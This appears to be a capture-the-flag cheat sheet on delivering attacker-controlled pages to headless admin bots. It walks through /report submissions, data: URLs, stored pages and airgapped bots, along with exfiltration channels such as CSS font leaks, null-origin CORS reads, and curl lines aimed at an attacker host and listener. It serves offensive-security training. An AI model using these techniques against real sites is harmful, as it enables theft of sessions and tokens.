# Delivery shapes — how the page reaches the bot

Every path an attacker-influenced page takes to the bot.

---

## 1. The /report endpoint — the classic delivery

```bash
curl -X POST "$BASE/report" -d 'url=https://attacker/page'
# or a JSON body
curl -X POST "$BASE/report" -H 'Content-Type: application/json' \
  -d '{"url":"https://attacker/page"}'
```

```text
the bot opens the submitted URL in an incognito/managed context —
your page's JS runs on YOUR origin (the classic shape) or doesn't
(the sealed shape). the deciding question: does YOUR URL's JS run?
```

## 2. The data: URL — an airgapped/null-origin case

```bash
curl -X POST "$BASE/report" --data-urlencode \
  'url=data:text/html,<html><script>...</script></html>'
```

```text
a data: URL — an opaque/null origin — the channel is a same-origin
leak or a server-state read. a null origin's CORS Origin is the
literal 'null' — a CORS-null-reflect reads the data.
```

## 3. The stored page — a same-origin case

```text
a stored page on the target's origin (a comment, a note, a profile)
— a same-origin CSS/JS channel — the Lax cookie rides. the stored
content's JS runs on the TARGET's origin — a same-origin leak.
```

## 4. The fragment — a #id the bot's page reads

```bash
curl -X POST "$BASE/report" -d 'url=https://target/page#' + fragment
```

```text
a URL fragment the bot's page reads — a same-origin navigation to
a specific element/state. the fragment carries the delivery.
```

## 5. The managed-policy bot — a forced sealed shape

```text
Chrome managed policy — URLBlocklist ['*'] + URLAllowlist — the bot
can ONLY visit the target's origin — NO attacker URL reaches it.
a declarative/server-state channel is the only one that works.
```

## 6. The airgapped bot — a server-state exfil

```text
a bot that can't reach attacker.com — the classic exfil (a listener)
fails — a server-state channel (a counter/recency/token you read on
the target), a write-back, or a DOM-writeback is the only exfil.
```

## 7. The meta-refresh — a same-site navigation

```text
a meta-refresh issued BY THE TARGET is a same-site navigation — it
carries the Lax cookie a cross-site fetch wouldn't. the sealed
shape's whole design avoids the cross-site cookie question.
```

## 8. The same-origin CSS + privileged URL — the verified card

```text
a unicode-range leak recovers a token's char-set; a second
stylesheet's @font-face src is the SAME-ORIGIN privileged URL — the
bot's font load is the privileged GET that no external client could
fire. the channel that read the token becomes the channel that
spends it.
```

## 9. The multiple-visits case — a per-visit delivery

```text
a channel that carries N bits per visit needs the bot to visit N
times — each /report is a separate visit. the delivery's feasibility
is the visit-count × the bits-per-visit.
```

## 10. The single-visit case — a high-bandwidth channel

```text
a recency/LRU channel carries thousands of bits per visit — a single
/report suffices. the channel's bandwidth determines the visit count.
```

## The per-shape delivery-selection

```text
a /report + a URL + JS runs          → the classic shape
a /report + a URL + JS blocked       → a declarative/server-state
a data: URL                          → a null-origin/same-origin case
a stored page                        → a same-origin case
a managed-policy bot                 → a declarative channel only
an airgapped bot                     → a server-state/write-back
a meta-refresh                       → a same-site navigation
a high-bandwidth channel             → a single visit
a low-bandwidth channel              → multiple visits
```

## The delivery-check — the bot's reachability

```bash
# can the bot reach your listener
curl -sI "https://attacker/listener" || echo "airgapped — a server-state channel"
# does the bot carry the flag session
grep -rnoE 'setCookie|cookie.*flag|flag.*cookie' <src> | head -5
# is the bot's URL attacker-controlled
grep -rnoE 'goto|visit|url.*submit' <src> | head -5
```

## The falsifier — the delivery is dead

```text
a managed-policy bot with no declarative channel AND no server-state
channel → the delivery surface is dead → a different class.
an airgapped bot with no server-state read → no exfil → a write-back
or a different class.
```
